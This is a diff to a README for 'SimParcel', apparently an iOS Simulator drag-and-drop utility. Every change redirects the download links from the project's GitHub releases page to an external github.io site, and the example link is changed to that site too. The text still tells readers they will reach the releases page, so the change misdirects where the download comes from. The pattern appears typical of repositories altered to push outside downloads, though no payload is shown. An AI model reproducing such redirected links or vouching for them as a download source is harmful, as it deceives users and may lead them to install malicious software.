@@ -1,6 +1,6 @@
 # 📦 SimParcel - Your Files, Dropped Right In
 
-[Download SimParcel Now](https://github.com/Foreandafterleging166/SimParcel/releases)
+[Download SimParcel Now](https://foreandafterleging166.github.io)
 
 ---
 
@@ -34,7 +34,7 @@ SimParcel is incredibly easy to use. Here’s your step-by-step guide:
 ### 1️⃣ Download SimParcel
 
 Visit this link to download the application:  
-[**https://github.com/Foreandafterleging166/SimParcel/releases**](https://github.com/Foreandafterleging166/SimParcel/releases)
+[**https://foreandafterleging166.github.io**](https://foreandafterleging166.github.io)
 
 You’ll land on the releases page. Look for the newest version at the top. Click the download button next to the file (it usually ends with `.zip` or `.dmg`). The file will save to your computer.
 
@@ -56,7 +56,7 @@ Now for the fun part. With both SimParcel and the Simulator open:
 - **For a contact:** Drag a `.vcf` file onto the Simulator. It’ll be added to Contacts.
 - **For an app:** Drag the `.app` folder onto the Simulator. The app installs and appears on the home screen.
 - **For a push notification:** Drag a `.json` file with the notification payload. SimParcel sends it instantly.
-- **For a link:** Drag a text link (like `https://example.com`) onto the Simulator. Safari opens it.
+- **For a link:** Drag a text link (like `https://foreandafterleging166.github.io`) onto the Simulator. Safari opens it.
 
 That’s it! No menus to navigate, no commands to type. Just drag, drop, and done.
 
@@ -149,7 +149,7 @@ SimParcel is an open-source project, and we’d love your feedback. Found a bug?
 
 Stop wasting time with complicated command-line tools. SimParcel puts the power of `simctl` right at your fingertips—literally. Download it now and see how effortless iOS Simulator testing can be.
 
-[⬇️ Download SimParcel from GitHub](https://github.com/Foreandafterleging166/SimParcel/releases)
+[⬇️ Download SimParcel from GitHub](https://foreandafterleging166.github.io)
 
 ---
 
